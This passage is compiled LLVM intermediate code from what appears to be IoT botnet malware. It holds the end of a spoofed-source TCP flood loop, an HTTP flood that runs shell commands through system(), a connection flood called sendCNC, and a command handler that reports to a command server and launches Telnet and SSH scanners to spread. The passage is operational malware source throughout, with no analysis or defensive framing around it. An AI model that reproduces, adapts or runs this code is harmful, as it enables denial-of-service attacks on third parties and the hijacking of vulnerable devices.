  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 2
  store i32 %100, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.0* %106 to %struct.anon.1*
  %108 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %107, i32 0, i32 3
  store i32 0, i32* %108, align 4
  %109 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon.0* %110 to %struct.anon.1*
  %112 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %111, i32 0, i32 4
  %113 = load i16, i16* %112, align 4
  %114 = and i16 %113, -241
  %115 = or i16 %114, 80
  store i16 %115, i16* %112, align 4
  %116 = load i8*, i8** %12, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %155, label %119

; <label>:119:                                    ; preds = %72
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.0* %121 to %struct.anon.1*
  %123 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -513
  %126 = or i16 %125, 512
  store i16 %126, i16* %123, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -1025
  %133 = or i16 %132, 1024
  store i16 %133, i16* %130, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon.0* %135 to %struct.anon.1*
  %137 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = and i16 %138, -257
  %140 = or i16 %139, 256
  store i16 %140, i16* %137, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.0* %142 to %struct.anon.1*
  %144 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -4097
  %147 = or i16 %146, 4096
  store i16 %147, i16* %144, align 4
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.0* %149 to %struct.anon.1*
  %151 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -2049
  %154 = or i16 %153, 2048
  store i16 %154, i16* %151, align 4
  br label %232

; <label>:155:                                    ; preds = %72
  %156 = load i8*, i8** %12, align 8
  %157 = call i8* @strtok(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %157, i8** %23, align 8
  br label %158

; <label>:158:                                    ; preds = %229, %155
  %159 = load i8*, i8** %23, align 8
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %231

; <label>:161:                                    ; preds = %158
  %162 = load i8*, i8** %23, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0)) #10
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %173, label %165

; <label>:165:                                    ; preds = %161
  %166 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.0* %167 to %struct.anon.1*
  %169 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = and i16 %170, -513
  %172 = or i16 %171, 512
  store i16 %172, i16* %169, align 4
  br label %229

; <label>:173:                                    ; preds = %161
  %174 = load i8*, i8** %23, align 8
  %175 = call i32 @strcmp(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0)) #10
  %176 = icmp ne i32 %175, 0
  br i1 %176, label %185, label %177

; <label>:177:                                    ; preds = %173
  %178 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.0* %179 to %struct.anon.1*
  %181 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -1025
  %184 = or i16 %183, 1024
  store i16 %184, i16* %181, align 4
  br label %228

; <label>:185:                                    ; preds = %173
  %186 = load i8*, i8** %23, align 8
  %187 = call i32 @strcmp(i8* %186, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i32 0, i32 0)) #10
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %197, label %189

; <label>:189:                                    ; preds = %185
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -257
  %196 = or i16 %195, 256
  store i16 %196, i16* %193, align 4
  br label %227

; <label>:197:                                    ; preds = %185
  %198 = load i8*, i8** %23, align 8
  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %209, label %201

; <label>:201:                                    ; preds = %197
  %202 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.0* %203 to %struct.anon.1*
  %205 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -4097
  %208 = or i16 %207, 4096
  store i16 %208, i16* %205, align 4
  br label %226

; <label>:209:                                    ; preds = %197
  %210 = load i8*, i8** %23, align 8
  %211 = call i32 @strcmp(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i32 0, i32 0)) #10
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %221, label %213

; <label>:213:                                    ; preds = %209
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %218, -2049
  %220 = or i16 %219, 2048
  store i16 %220, i16* %217, align 4
  br label %225

; <label>:221:                                    ; preds = %209
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = load i8*, i8** %23, align 8
  %224 = call i32 (i32, i8*, ...) @sockprintf(i32 %222, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.91, i32 0, i32 0), i8* %223)
  br label %225

; <label>:225:                                    ; preds = %221, %213
  br label %226

; <label>:226:                                    ; preds = %225, %201
  br label %227

; <label>:227:                                    ; preds = %226, %189
  br label %228

; <label>:228:                                    ; preds = %227, %177
  br label %229

; <label>:229:                                    ; preds = %228, %165
  %230 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %230, i8** %23, align 8
  br label %158

; <label>:231:                                    ; preds = %158
  br label %232

; <label>:232:                                    ; preds = %231, %119
  %233 = call i32 @rand_cmwc()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.0* %236 to %struct.anon.1*
  %238 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %237, i32 0, i32 5
  store i16 %234, i16* %238, align 2
  %239 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.0* %240 to %struct.anon.1*
  %242 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %241, i32 0, i32 6
  store i16 0, i16* %242, align 4
  %243 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.0* %244 to %struct.anon.1*
  %246 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %245, i32 0, i32 7
  store i16 0, i16* %246, align 2
  %247 = load i32, i32* %9, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %251

; <label>:249:                                    ; preds = %232
  %250 = call i32 @rand_cmwc()
  br label %256

; <label>:251:                                    ; preds = %232
  %252 = load i32, i32* %9, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #13
  %255 = zext i16 %254 to i32
  br label %256

; <label>:256:                                    ; preds = %251, %249
  %257 = phi i32 [ %250, %249 ], [ %255, %251 ]
  %258 = trunc i32 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.0* %260 to %struct.anon.1*
  %262 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %261, i32 0, i32 1
  store i16 %258, i16* %262, align 2
  %263 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = call zeroext i16 @tcpcsum(%struct.iphdr* %263, %struct.tcphdr* %264)
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.0* %267 to %struct.anon.1*
  %269 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %268, i32 0, i32 6
  store i16 %265, i16* %269, align 4
  %270 = bitcast i8* %77 to i16*
  %271 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  %273 = load i16, i16* %272, align 2
  %274 = zext i16 %273 to i32
  %275 = call zeroext i16 @csum(i16* %270, i32 %274)
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 %275, i16* %277, align 2
  %278 = call i64 @time(i64* null) #2
  %279 = load i32, i32* %10, align 4
  %280 = sext i32 %279 to i64
  %281 = add nsw i64 %278, %280
  %282 = trunc i64 %281 to i32
  store i32 %282, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %283

; <label>:283:                                    ; preds = %337, %336, %256
  br label %284

; <label>:284:                                    ; preds = %283
  %285 = load i32, i32* %17, align 4
  %286 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %287 = call i64 @sendto(i32 %285, i8* %77, i64 %75, i32 0, %struct.sockaddr* %286, i32 16)
  %288 = load i32, i32* %19, align 4
  %289 = call i32 @getRandomIP(i32 %288)
  %290 = call i32 @htonl(i32 %289) #13
  %291 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 8
  store i32 %290, i32* %292, align 4
  %293 = call i32 @rand_cmwc()
  %294 = trunc i32 %293 to i16
  %295 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 3
  store i16 %294, i16* %296, align 4
  %297 = call i32 @rand_cmwc()
  %298 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon.0* %299 to %struct.anon.1*
  %301 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %300, i32 0, i32 2
  store i32 %297, i32* %301, align 4
  %302 = call i32 @rand_cmwc()
  %303 = trunc i32 %302 to i16
  %304 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 0
  %306 = bitcast %union.anon.0* %305 to %struct.anon.1*
  %307 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %306, i32 0, i32 0
  store i16 %303, i16* %307, align 4
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon.0* %309 to %struct.anon.1*
  %311 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %310, i32 0, i32 6
  store i16 0, i16* %311, align 4
  %312 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = call zeroext i16 @tcpcsum(%struct.iphdr* %312, %struct.tcphdr* %313)
  %315 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %316 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %315, i32 0, i32 0
  %317 = bitcast %union.anon.0* %316 to %struct.anon.1*
  %318 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %317, i32 0, i32 6
  store i16 %314, i16* %318, align 4
  %319 = bitcast i8* %77 to i16*
  %320 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 2
  %322 = load i16, i16* %321, align 2
  %323 = zext i16 %322 to i32
  %324 = call zeroext i16 @csum(i16* %319, i32 %323)
  %325 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %326 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %325, i32 0, i32 7
  store i16 %324, i16* %326, align 2
  %327 = load i32, i32* %25, align 4
  %328 = load i32, i32* %15, align 4
  %329 = icmp eq i32 %327, %328
  br i1 %329, label %330, label %337

; <label>:330:                                    ; preds = %284
  %331 = call i64 @time(i64* null) #2
  %332 = load i32, i32* %24, align 4
  %333 = sext i32 %332 to i64
  %334 = icmp sgt i64 %331, %333
  br i1 %334, label %335, label %336

; <label>:335:                                    ; preds = %330
  br label %340

; <label>:336:                                    ; preds = %330
  store i32 0, i32* %25, align 4
  br label %283

; <label>:337:                                    ; preds = %284
  %338 = load i32, i32* %25, align 4
  %339 = add i32 %338, 1
  store i32 %339, i32* %25, align 4
  br label %283

; <label>:340:                                    ; preds = %335
  %341 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %341)
  br label %342

; <label>:342:                                    ; preds = %340, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [80 x i8*], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = call i64 @time(i64* null) #2
  %10 = load i32, i32* %4, align 4
  %11 = sext i32 %10 to i64
  %12 = add nsw i64 %9, %11
  %13 = trunc i64 %12 to i32
  store i32 %13, i32* %5, align 4
  %14 = call i32 @rand() #2
  %15 = sext i32 %14 to i64
  %16 = urem i64 %15, 23
  %17 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %16
  %18 = load i8*, i8** %17, align 8
  store i8* %18, i8** %7, align 8
  %19 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %20 = bitcast i8** %19 to i8*
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* %20, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %22 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %23 = bitcast i8** %22 to i8*
  %24 = load i8*, i8** %7, align 8
  %25 = call i8* @strcat(i8* %23, i8* %24) #2
  %26 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %27 = bitcast i8** %26 to i8*
  %28 = call i8* @strcat(i8* %27, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %29 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %30 = bitcast i8** %29 to i8*
  %31 = load i8*, i8** %3, align 8
  %32 = call i8* @strcat(i8* %30, i8* %31) #2
  br label %33

; <label>:33:                                     ; preds = %38, %2
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = call i64 @time(i64* null) #2
  %37 = icmp sgt i64 %35, %36
  br i1 %37, label %38, label %61

; <label>:38:                                     ; preds = %33
  %39 = call i32 @rand() #2
  %40 = sext i32 %39 to i64
  %41 = urem i64 %40, 23
  %42 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %41
  %43 = load i8*, i8** %42, align 8
  store i8* %43, i8** %7, align 8
  %44 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %45 = bitcast i8** %44 to i8*
  %46 = call i32 (i8*, i8*, ...) @sprintf(i8* %45, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0)) #2
  %47 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %48 = bitcast i8** %47 to i8*
  %49 = load i8*, i8** %7, align 8
  %50 = call i8* @strcat(i8* %48, i8* %49) #2
  %51 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %52 = bitcast i8** %51 to i8*
  %53 = call i8* @strcat(i8* %52, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0)) #2
  %54 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %55 = bitcast i8** %54 to i8*
  %56 = load i8*, i8** %3, align 8
  %57 = call i8* @strcat(i8* %55, i8* %56) #2
  %58 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %59 = bitcast i8** %58 to i8*
  %60 = call i32 @system(i8* %59)
  br label %33

; <label>:61:                                     ; preds = %33
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i64 @time(i64* null) #2
  %11 = load i32, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = add nsw i64 %10, %12
  %14 = trunc i64 %13 to i32
  store i32 %14, i32* %7, align 4
  %15 = load i8*, i8** %4, align 8
  %16 = call i32 @inet_addr(i8* %15) #2
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = load i32, i32* %5, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  br label %24

; <label>:24:                                     ; preds = %29, %3
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = call i64 @time(i64* null) #2
  %28 = icmp sgt i64 %26, %27
  br i1 %28, label %29, label %37

; <label>:29:                                     ; preds = %24
  %30 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %33 = call i32 @connect(i32 %31, %struct.sockaddr* %32, i32 16)
  %34 = call i32 @sleep(i32 1)
  %35 = load i32, i32* %8, align 4
  %36 = call i32 @close(i32 %35)
  br label %24

; <label>:37:                                     ; preds = %24
  ret void
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0)) #10
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %46, label %43

; <label>:43:                                     ; preds = %2
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = call i32 (i32, i8*, ...) @sockprintf(i32 %44, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0))
  br label %622

; <label>:46:                                     ; preds = %2
  %47 = load i8**, i8*** %4, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @strcmp(i8* %49, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i32 0, i32 0)) #10
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %57, label %52

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %55 = call i8* @inet_ntoa(i32 %54) #2
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.96, i32 0, i32 0), i8* %55)
  br label %622

; <label>:57:                                     ; preds = %46
  %58 = load i8**, i8*** %4, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @strcmp(i8* %60, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.97, i32 0, i32 0)) #10
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %133, label %63

; <label>:63:                                     ; preds = %57
  %64 = load i32, i32* %3, align 4
  %65 = icmp ne i32 %64, 2
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %63
  %67 = load i32, i32* @mainCommSock, align 4
  %68 = call i32 (i32, i8*, ...) @sockprintf(i32 %67, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.98, i32 0, i32 0))
  br label %622

; <label>:69:                                     ; preds = %63
  %70 = load i8**, i8*** %4, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 1
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @strcmp(i8* %72, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.99, i32 0, i32 0)) #10
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %132, label %75

; <label>:75:                                     ; preds = %69
  %76 = load i32, i32* @scanPid, align 4
  %77 = icmp eq i32 %76, 0
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %75
  br label %622

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* @mainCommSock, align 4
  %81 = call i32 (i32, i8*, ...) @sockprintf(i32 %80, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.100, i32 0, i32 0))
  %82 = load i32, i32* @scanPid, align 4
  %83 = call i32 @kill(i32 %82, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @strcmp(i8* %86, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i32 0, i32 0)) #10
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %107, label %89

; <label>:89:                                     ; preds = %79
  %90 = load i32, i32* @scanPid, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %93

; <label>:92:                                     ; preds = %89
  br label %622

; <label>:93:                                     ; preds = %89
  %94 = call i32 @fork() #2
  store i32 %94, i32* %6, align 4
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 (i32, i8*, ...) @sockprintf(i32 %95, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.102, i32 0, i32 0))
  %97 = load i32, i32* %6, align 4
  %98 = icmp ugt i32 %97, 0
  br i1 %98, label %99, label %101

; <label>:99:                                     ; preds = %93
  %100 = load i32, i32* %6, align 4
  store i32 %100, i32* @scanPid, align 4
  br label %622

; <label>:101:                                    ; preds = %93
  %102 = load i32, i32* %6, align 4
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %101
  br label %622

; <label>:105:                                    ; preds = %101
  br label %106

; <label>:106:                                    ; preds = %105
  call void (i32, ...) bitcast (void ()* @TelnetScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:107:                                    ; preds = %79
  %108 = load i8**, i8*** %4, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 1
  %110 = load i8*, i8** %109, align 8
  %111 = call i32 @strcmp(i8* %110, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0)) #10
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %131, label %113

; <label>:113:                                    ; preds = %107
  %114 = load i32, i32* @scanPid, align 4
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %113
  br label %622

; <label>:117:                                    ; preds = %113
  %118 = call i32 @fork() #2
  store i32 %118, i32* %7, align 4
  %119 = load i32, i32* @mainCommSock, align 4
  %120 = call i32 (i32, i8*, ...) @sockprintf(i32 %119, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.104, i32 0, i32 0))
  %121 = load i32, i32* %7, align 4
  %122 = icmp ugt i32 %121, 0
  br i1 %122, label %123, label %125

; <label>:123:                                    ; preds = %117
  %124 = load i32, i32* %7, align 4
  store i32 %124, i32* @scanPid, align 4
  br label %622

; <label>:125:                                    ; preds = %117
  %126 = load i32, i32* %7, align 4
  %127 = icmp eq i32 %126, -1
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %125
  br label %622

; <label>:129:                                    ; preds = %125
  br label %130

; <label>:130:                                    ; preds = %129
  call void (i32, ...) bitcast (void ()* @SSHScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:131:                                    ; preds = %107
  br label %132

; <label>:132:                                    ; preds = %131, %69
  br label %133

; <label>:133:                                    ; preds = %132, %57
  %134 = load i8**, i8*** %4, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 0
  %136 = load i8*, i8** %135, align 8
